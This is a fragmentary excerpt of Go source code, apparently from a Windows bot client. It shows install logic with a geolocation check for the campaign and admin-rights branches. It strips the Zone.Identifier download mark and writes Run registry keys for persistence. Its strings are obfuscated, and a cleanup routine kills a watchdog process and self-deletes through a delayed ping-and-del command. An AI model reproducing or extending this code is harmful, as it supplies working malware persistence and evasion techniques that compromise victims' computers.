...
var myInstall = tmpPath
var myAdminInstall = winDirPath
var myTime = time.Now().Format(time.RFC1123Z)
	...
	if campaignMode { //Is this a campain bot?
		if maxMindWork(0) { //Valid campaing area
			...
			if isAdmin { //Got Admin rights!
				...
				_ = os.Remove(myAdminInstall + myInstallName + deobfuscate("/fyf;[pof/Jefoujgjfs")) // .exe:Zone.Identifier
		...
		if isAdmin { //Got Admin rights!
			...
			_, _ = cmd3.Output()
			//Remove Zone Identifier
			_ = os.Remove(myInstall + myInstallName + deobfuscate("/fyf;[pof/Jefoujgjfs")) // .exe:Zone.Identifier
			//Add to startup
			_ = writeRegistryKey(registry.CURRENT_USER, runPath, myInstallName, myInstall+myInstallName+".exe")
			//Handle Bot Regigtry
			cmd4 := exec.Command("cmd", "/Q", "/C", "reg", "add", "HKCU\\Software\\"+myRegistryName, "/f")
...
func uninstall() {
	...
	if err != nil {
		...
		activeDefense = false
		kill(watchdogName + ".exe")
		goodbyedog := exec.Command("cmd", "/Q", "/C", deobfuscate("qjoh!2/2/2/2!.o!2!.x!5111!?!Ovm!'!Efm!")+myInstall+watchdogName+".exe") //  ping 1.1.1.1 -n 1 -w 4000 > Nul & Del
